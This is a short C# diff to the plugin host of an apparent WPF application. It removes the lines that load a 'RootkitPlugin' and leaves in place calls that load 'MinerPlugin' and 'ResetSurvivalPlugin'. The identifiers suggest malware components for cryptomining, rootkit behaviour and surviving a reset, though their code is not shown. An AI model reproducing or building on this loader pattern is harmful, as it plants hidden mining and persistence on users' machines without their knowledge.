@@ -81,9 +81,6 @@ namespace WpfApp.Plugins
             if (!_host.LoadedPlugins.ContainsKey("miner"))
                 await _host.LoadPlugin(new MinerPlugin());
 
-            if (!_host.LoadedPlugins.ContainsKey("rootkit"))
-                await _host.LoadPlugin(new RootkitPlugin());
-
             if (!_host.LoadedPlugins.ContainsKey("resetsurvival"))
                 await _host.LoadPlugin(new ResetSurvivalPlugin());
 
